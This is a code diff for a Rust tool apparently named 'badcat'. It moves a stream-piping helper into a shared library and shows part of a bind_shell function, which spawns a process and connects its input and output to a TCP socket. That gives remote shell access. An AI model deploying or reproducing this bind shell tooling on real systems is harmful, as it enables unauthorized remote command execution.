@@ -7,8 +7,9 @@ use std::fs::File;
 use std::net::{TcpListener, TcpStream};
 use std::path::PathBuf;
 use std::process::{Child, Command, Stdio};
-use std::{error, io, mem, ptr, thread};
+use std::{error, mem, ptr};
 
+use badcat_lib::io;
 use memmap::MmapMut;
 
 fn main() -> Result<(), Box<dyn error::Error>> {
@@ -130,36 +131,6 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
     Ok(())
 }
 
-fn pipe_thread<R, W>(mut r: R, mut w: W) -> thread::JoinHandle<()>
-where
-    R: io::Read + Send + 'static,
-    W: io::Write + Send + 'static,
-{
-    thread::spawn(move || {
-        let mut buffer = [0; 1024];
-        loop {
-            let len = match r.read(&mut buffer) {
-                Ok(len) => len,
-                Err(_) => break,
-            };
-
-            if len == 0 {
-                break;
-            }
-
-            match w.write(&buffer[..len]) {
-                Ok(_) => {}
-                Err(_) => break,
-            };
-
-            match w.flush() {
-                Ok(_) => {}
-                Err(_) => break,
-            };
-        }
-    })
-}
-
 fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     let mut args: Vec<&str> = Vec::new();
 
@@ -185,9 +156,9 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     let stream_out = stream.try_clone()?;
     let stream_err = stream.try_clone()?;
 
-    let in_thread = pipe_thread(stream_in, stdin);
-    let out_thread = pipe_thread(stdout, stream_out);
-    let err_thread = pipe_thread(stderr, stream_err);
+    let in_thread = io::pipe_io(stream_in, stdin);
+    let out_thread = io::pipe_io(stdout, stream_out);
+    let err_thread = io::pipe_io(stderr, stream_err);
 
     in_thread.join().unwrap();
     out_thread.join().unwrap();
